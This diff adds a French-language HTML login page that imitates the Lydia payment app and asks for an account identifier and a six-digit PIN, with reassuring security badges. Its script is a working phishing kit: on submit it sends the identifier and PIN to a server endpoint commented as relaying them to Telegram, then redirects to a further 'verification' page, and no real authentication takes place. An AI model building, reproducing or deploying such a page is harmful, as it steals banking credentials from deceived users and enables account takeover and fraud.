@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authentification - Lydia</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary-blue: #0066FF;
+      --primary-light: #E3F2FD;
+      --white: #FFFFFF;
+      --black: #000;
+      --gray-light: #f8f9fa;
+      --gray-medium: #e9ecef;
+      --gray-dark: #6c757d;
+      --shadow: 0 10px 30px rgba(0,0,0,0.15);
+      --shadow-light: 0 5px 15px rgba(0,0,0,0.1);
+      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      --border-radius: 20px;
+      --green: #28a745;
+      --red: #dc3545;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--primary-light);
+      color: var(--black);
+      line-height: 1.5;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    header {
+      background: var(--primary-light);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: var(--shadow-light);
+      padding: 15px 0;
+      width: 100%;
+    }
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 32px;
+      font-weight: 900;
+      letter-spacing: -1px;
+      color: var(--primary-blue);
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+    }
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--primary-blue);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 24px;
+    }
+    .desktop-nav { display: flex; gap: 30px; }
+    .desktop-nav a {
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 17px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      border-radius: 50px;
+      transition: var(--transition);
+    }
+    .desktop-nav a:hover, .desktop-nav a.active {
+      background: rgba(0, 102, 255, 0.1);
+      color: var(--primary-blue);
+      transform: translateY(-2px);
+    }
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 30px;
+      height: 25px;
+      position: relative;
+      z-index: 1001;
+    }
+    .mobile-menu-btn span {
+      display: block;
+      width: 100%;
+      height: 3px;
+      background: var(--primary-blue);
+      border-radius: 3px;
+      transition: var(--transition);
+      position: absolute;
+    }
+    .mobile-menu-btn span:nth-child(1) { top: 0; }
+    .mobile-menu-btn span:nth-child(2) { top: 11px; }
+    .mobile-menu-btn span:nth-child(3) { top: 22px; }
+    .mobile-menu-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      right: -100%;
+      width: 85%;
+      max-width: 400px;
+      height: 100%;
+      background: var(--white);
+      z-index: 1000;
+      box-shadow: -5px 0 15px rgba(0,0,0,0.1);
+      transition: right 0.4s cubic-bezier(0.77, 0.2, 0.05, 1);
+      display: flex;
+      flex-direction: column;
+    }
+    .mobile-nav.active { right: 0; }
+    .mobile-nav-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid rgba(0,0,0,0.1);
+    }
+    .mobile-menu-close {
+      background: none;
+      border: none;
+      font-size: 24px;
+      color: var(--primary-blue);
+      cursor: pointer;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: var(--transition);
+    }
+    .mobile-menu-close:hover { background: rgba(0, 102, 255, 0.1); }
+    .mobile-nav-links { flex: 1; padding: 20px 0; }
+    .mobile-nav-links a {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 18px 30px;
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 18px;
+      transition: var(--transition);
+      border-left: 4px solid transparent;
+    }
+    .mobile-nav-links a:hover, .mobile-nav-links a.active { 
+      background: rgba(0, 102, 255, 0.1);
+      border-left-color: var(--primary-blue);
+      color: var(--primary-blue);
+    }
+    .mobile-nav-footer { padding: 20px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1); color: var(--gray-dark); font-weight: 600; }
+    
+    .auth-hero { padding: 20px 0 20px; text-align: center; width: 100%; }
+    .auth-hero h1 { font-size: 36px; font-weight: 900; margin-bottom: 10px; color: var(--primary-blue); }
+    .auth-hero p { font-size: 16px; color: var(--gray-dark); max-width: 700px; margin: 0 auto 0; }
+    
+    .auth-container {
+      background: var(--white);
+      border-radius: var(--border-radius);
+      padding: 30px;
+      margin: 30px auto;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: var(--shadow);
+    }
+    
+    .auth-form { display: flex; flex-direction: column; width: 100%; }
+    .form-group { margin-bottom: 20px; width: 100%; }
+    .field-label { font-size: 14px; font-weight: 600; color: var(--black); margin-bottom: 8px; }
+    .field-label .required { color: var(--red); }
+    
+    .input-wrapper { position: relative; width: 100%; }
+    .form-input {
+      width: 100%;
+      padding: 14px 45px 14px 16px;
+      border: 2px solid var(--gray-medium);
+      border-radius: 10px;
+      font-size: 15px;
+      transition: var(--transition);
+      background: var(--white);
+      color: var(--black);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    .form-input:focus { 
+      outline: none; 
+      border-color: var(--primary-blue); 
+      box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15); 
+      background-color: #f8fbff; 
+    }
+    .form-input::placeholder { color: var(--gray-dark); opacity: 0.7; }
+    .form-input.error { border-color: var(--red); box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15); }
+    .input-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: var(--gray-dark); font-size: 16px; pointer-events: none; }
+    
+    .error-message {
+      color: var(--red);
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+      align-items: center;
+      gap: 5px;
+    }
+    .error-message.visible { display: flex; }
+    
+    .password-section { display: none; margin-top: 20px; }
+    .password-section.active { display: block; animation: slideIn 0.2s ease-out; }
+    
+    @keyframes slideIn { 
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .password-display {
+      width: 100%;
+      padding: 16px;
+      border: 2px solid var(--gray-medium);
+      border-radius: 10px;
+      text-align: center;
+      font-size: 32px;
+      letter-spacing: 8px;
+      font-weight: 700;
+      color: var(--primary-blue);
+      margin-bottom: 20px;
+      min-height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f8fbff;
+    }
+    
+    .keyboard {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    
+    .key-btn {
+      padding: 16px;
+      border: 2px solid var(--gray-medium);
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: var(--transition);
+      background: var(--white);
+      color: var(--black);
+    }
+    
+    .key-btn:hover {
+      background: var(--primary-blue);
+      color: var(--white);
+      border-color: var(--primary-blue);
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 102, 255, 0.3);
+    }
+    
+    .key-btn:active {
+      transform: translateY(0);
+    }
+    
+    .key-btn.delete {
+      grid-column: 2 / 4;
+      background: #ffe8e8;
+      color: var(--red);
+      border-color: var(--red);
+    }
+    
+    .key-btn.delete:hover {
+      background: var(--red);
+      color: var(--white);
+    }
+    
+    .key-btn.confirm {
+      grid-column: 1 / 4;
+      background: linear-gradient(135deg, var(--primary-blue), #0052CC);
+      color: var(--white);
+      border-color: var(--primary-blue);
+      font-size: 16px;
+    }
+    
+    .key-btn.confirm:hover {
+      background: linear-gradient(135deg, #0052CC, var(--primary-blue));
+      box-shadow: 0 8px 20px rgba(0, 102, 255, 0.4);
+    }
+    
+    .key-btn.confirm:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+    
+    .security-badge { 
+      display: flex; 
+      align-items: center; 
+      gap: 10px; 
+      background: var(--gray-light); 
+      padding: 12px 18px; 
+      border-radius: 10px; 
+      margin-bottom: 15px; 
+      border-left: 4px solid var(--primary-blue); 
+      justify-content: center; 
+    }
+    .security-badge i { color: var(--primary-blue); font-size: 20px; }
+    .security-badge p { font-size: 14px; color: var(--gray-dark); font-weight: 600; }
+    
+    .slide-in { opacity: 0; transform: translateY(30px); transition: all 0.8s cubic-bezier(0.22, 1, 0.36, 1); }
+    .slide-in.visible { opacity: 1; transform: translateY(0); }
+    
+    footer {
+      background: var(--black);
+      color: var(--white);
+      padding: 60px 0 30px;
+      margin-top: auto;
+      width: 100%;
+    }
+    .footer-content { display: flex; flex-wrap: wrap; justify-content: center; gap: 40px; margin-bottom: 40px; width: 100%; max-width: 1200px; margin: 0 auto 40px; }
+    .footer-section { flex: 1; min-width: 250px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .footer-section h3 { font-size: 24px; margin-bottom: 20px; color: var(--primary-blue); }
+    .footer-section p { margin-bottom: 15px; opacity: 0.9; }
+    .footer-section a { display: block; color: var(--white); text-decoration: none; margin-bottom: 10px; opacity: 0.8; transition: var(--transition); }
+    .footer-section a:hover { opacity: 1; color: var(--primary-blue); transform: translateX(5px); }
+    .social-icons { display: flex; gap: 15px; margin-top: 20px; justify-content: center; }
+    .social-icons a { width: 40px; height: 40px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: var(--transition); }
+    .social-icons a:hover { background: var(--primary-blue); color: var(--white); transform: translateY(-3px); }
+    .footer-bottom { text-align: center; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); opacity: 0.7; width: 100%; max-width: 1200px; margin: 0 auto; }
+    
+    @media (max-width: 768px) {
+      .desktop-nav { display: none; }
+      .mobile-menu-btn { display: block; }
+      .mobile-nav { display: flex; }
+      .mobile-menu-overlay.active { display: block; opacity: 1; }
+      .mobile-nav.active { right: 0; }
+      .mobile-menu-btn.active span:nth-child(1) { transform: rotate(45deg); top: 11px; }
+      .mobile-menu-btn.active span:nth-child(2) { opacity: 0; }
+      .mobile-menu-btn.active span:nth-child(3) { transform: rotate(-45deg); top: 11px; }
+      .logo { font-size: 24px; }
+      .auth-hero h1 { font-size: 28px; }
+      .auth-hero p { font-size: 15px; }
+      .auth-container { padding: 30px; margin: 30px auto; max-width: 100%; }
+      .footer-content { flex-direction: column; gap: 30px; align-items: center; }
+    }
+    
+    @media (max-width: 480px) {
+      .container { padding: 0 15px; }
+      .logo { font-size: 24px; }
+      .auth-hero h1 { font-size: 24px; }
+      .auth-hero p { font-size: 14px; }
+      .auth-container { padding: 20px; }
+      .form-input { padding: 12px 40px 12px 14px; font-size: 14px; }
+      .field-label { font-size: 13px; }
+      .keyboard { gap: 8px; }
+      .key-btn { padding: 14px; font-size: 16px; }
+      .password-display { font-size: 24px; letter-spacing: 6px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="header-container">
+      <div class="logo">
+        <div class="logo-icon">Λ</div>
+        Lydia
+      </div>
+      
+      <nav class="desktop-nav">
+        <a href="index.html">Accueil</a>
+        <a href="validation.html">Validation</a>
+        <a href="verification.html">Vérification</a>
+        <a href="authentification.html" class="active">Authentification</a>
+      </nav>
+      
+      <button class="mobile-menu-btn" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      
+      <div class="mobile-menu-overlay"></div>
+      
+      <nav class="mobile-nav">
+        <div class="mobile-nav-header">
+          <div class="logo">
+            <div class="logo-icon">Λ</div>
+            Lydia
+          </div>
+          <button class="mobile-menu-close" aria-label="Fermer">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="mobile-nav-links">
+          <a href="index.html"><i class="fas fa-home"></i><span>Accueil</span></a>
+          <a href="validation.html"><i class="fas fa-check"></i><span>Validation</span></a>
+          <a href="verification.html"><i class="fas fa-shield-alt"></i><span>Vérification</span></a>
+          <a href="authentification.html" class="active"><i class="fas fa-lock"></i><span>Authentification</span></a>
+        </div>
+        <div class="mobile-nav-footer"><p>Paiement instantané sécurisé</p></div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="auth-hero">
+      <div class="container">
+        <h1 class="slide-in">Authentification sécurisée</h1>
+        <p class="slide-in">Veuillez entrer vos identifiants pour accéder à votre compte Lydia</p>
+      </div>
+    </section>
+
+    <section class="auth-container slide-in">
+      <div class="security-badge">
+        <i class="fas fa-shield-alt"></i>
+        <p>Connexion chiffrée et sécurisée</p>
+      </div>
+      
+      <form id="authForm" class="auth-form" novalidate>
+        <div class="form-group">
+          <label class="field-label">
+            Identifiant <span class="required">*</span>
+          </label>
+          <div class="input-wrapper">
+            <input type="text" 
+                   id="accountId" 
+                   class="form-input" 
+                   placeholder="Numéro de compte ou identifiant"
+                   required>
+            <div class="input-icon">
+              <i class="fas fa-user"></i>
+            </div>
+          </div>
+          <div class="error-message" id="accountIdError">
+            <i class="fas fa-exclamation-circle"></i> Veuillez saisir votre identifiant.
+          </div>
+        </div>
+
+        <!-- SECTION MOT DE PASSE AVEC CLAVIER NUMERIQUE -->
+        <div class="password-section" id="passwordSection">
+          <label class="field-label">
+            Mot de passe <span class="required">*</span>
+          </label>
+          
+          <div class="password-display" id="passwordDisplay">●●●●●●</div>
+          
+          <div class="keyboard">
+            <button type="button" class="key-btn" data-key="1">1</button>
+            <button type="button" class="key-btn" data-key="2">2</button>
+            <button type="button" class="key-btn" data-key="3">3</button>
+            <button type="button" class="key-btn" data-key="4">4</button>
+            <button type="button" class="key-btn" data-key="5">5</button>
+            <button type="button" class="key-btn" data-key="6">6</button>
+            <button type="button" class="key-btn" data-key="7">7</button>
+            <button type="button" class="key-btn" data-key="8">8</button>
+            <button type="button" class="key-btn" data-key="9">9</button>
+            <button type="button" class="key-btn" data-key="0">0</button>
+            <button type="button" class="key-btn delete" id="deleteBtn">
+              <i class="fas fa-backspace"></i> Effacer
+            </button>
+            <button type="submit" class="key-btn confirm" id="confirmBtn" disabled>
+              <i class="fas fa-lock"></i> Connexion
+            </button>
+          </div>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>Lydia</h3>
+          <p>Le futur du paiement instantané</p>
+          <div class="social-icons">
+            <a href="#" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+            <a href="#" title="Twitter"><i class="fab fa-twitter"></i></a>
+            <a href="#" title="Instagram"><i class="fab fa-instagram"></i></a>
+            <a href="#" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+          </div>
+        </div>
+        
+        <div class="footer-section">
+          <h3>Navigation</h3>
+          <a href="index.html">Accueil</a>
+          <a href="validation.html">Validation</a>
+          <a href="verification.html">Vérification</a>
+          <a href="authentification.html">Authentification</a>
+        </div>
+        
+        <div class="footer-section">
+          <h3>Sécurité</h3>
+          <p><i class="fas fa-shield-alt"></i> Cryptage SSL 256 bits</p>
+          <p><i class="fas fa-lock"></i> Données sécurisées</p>
+        </div>
+      </div>
+      
+      <div class="footer-bottom">
+        <p>&copy; 2026 Lydia. Tous droits réservés.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Fonction pour envoyer les données à Telegram
+    async function sendToTelegram(data) {
+      try {
+        await fetch('/api/send-telegram.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      } catch (error) {
+        console.error('Erreur d\'envoi Telegram:', error);
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+      const mobileMenuClose = document.querySelector('.mobile-menu-close');
+      const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
+      const mobileNav = document.querySelector('.mobile-nav');
+      const mobileLinks = document.querySelectorAll('.mobile-nav-links a');
+      
+      mobileMenuBtn.addEventListener('click', () => {
+        mobileNav.classList.add('active');
+        mobileMenuOverlay.classList.add('active');
+        mobileMenuBtn.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+      
+      function closeMobileMenu() {
+        mobileNav.classList.remove('active');
+        mobileMenuOverlay.classList.remove('active');
+        mobileMenuBtn.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+      
+      mobileMenuClose.addEventListener('click', closeMobileMenu);
+      mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+      mobileLinks.forEach(link => link.addEventListener('click', closeMobileMenu));
+      
+      const elements = document.querySelectorAll('.slide-in');
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            observer.unobserve(entry.target);
+          }
+        });
+      }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+      elements.forEach(el => observer.observe(el));
+      
+      // AUTHENTIFICATION
+      const accountIdInput = document.getElementById('accountId');
+      const passwordSection = document.getElementById('passwordSection');
+      const passwordDisplay = document.getElementById('passwordDisplay');
+      const deleteBtn = document.getElementById('deleteBtn');
+      const confirmBtn = document.getElementById('confirmBtn');
+      const accountIdError = document.getElementById('accountIdError');
+      const authForm = document.getElementById('authForm');
+      const keyBtns = document.querySelectorAll('.key-btn[data-key]');
+      
+      let password = '';
+      const MAX_PASSWORD_LENGTH = 6;
+      
+      // Afficher le clavier numerique en temps reel lors de la saisie
+      accountIdInput.addEventListener('input', function() {
+        if (this.value.trim().length > 0) {
+          accountIdError.classList.remove('visible');
+          this.classList.remove('error');
+          passwordSection.classList.add('active');
+        } else {
+          passwordSection.classList.remove('active');
+          password = '';
+          updatePasswordDisplay();
+          updateConfirmButton();
+        }
+      });
+      
+      accountIdInput.addEventListener('focus', function() {
+        accountIdError.classList.remove('visible');
+        this.classList.remove('error');
+        if (this.value.trim().length > 0) {
+          passwordSection.classList.add('active');
+        }
+      });
+      
+      // Clavier numérique
+      keyBtns.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          e.preventDefault();
+          const key = btn.getAttribute('data-key');
+          
+          if (password.length < MAX_PASSWORD_LENGTH) {
+            password += key;
+            updatePasswordDisplay();
+            updateConfirmButton();
+          }
+        });
+      });
+      
+      // Bouton effacer
+      deleteBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (password.length > 0) {
+          password = password.slice(0, -1);
+          updatePasswordDisplay();
+          updateConfirmButton();
+        }
+      });
+      
+      function updatePasswordDisplay() {
+        const dots = '●'.repeat(password.length);
+        const empty = '○'.repeat(MAX_PASSWORD_LENGTH - password.length);
+        passwordDisplay.textContent = dots + empty;
+      }
+      
+      function updateConfirmButton() {
+        confirmBtn.disabled = password.length < 4;
+      }
+      
+      // Soumission du formulaire
+      authForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        if (!accountIdInput.value.trim()) {
+          accountIdError.classList.add('visible');
+          accountIdInput.classList.add('error');
+          return;
+        }
+        
+        if (password.length < 4) {
+          return;
+        }
+        
+        // Simulation de connexion
+        confirmBtn.disabled = true;
+        confirmBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connexion...';
+        
+        setTimeout(() => {
+          // Envoyer les données à Telegram
+          sendToTelegram({
+            identifiant: accountIdInput.value,
+            password: password
+          });
+          
+          // Redirection
+          window.location.href = 'verification-final.html';
+        }, 1500);
+      });
+    });
+  </script>
+</body>
+</html>
